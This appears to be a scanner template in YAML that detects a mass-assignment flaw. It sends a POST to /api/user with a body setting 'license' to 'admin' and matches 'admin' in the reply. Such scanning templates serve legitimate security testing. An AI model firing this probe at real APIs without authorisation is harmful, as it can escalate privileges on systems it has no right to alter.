id: mass3-238
name: 'Mass field license'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered license on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"t","license":"admin"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
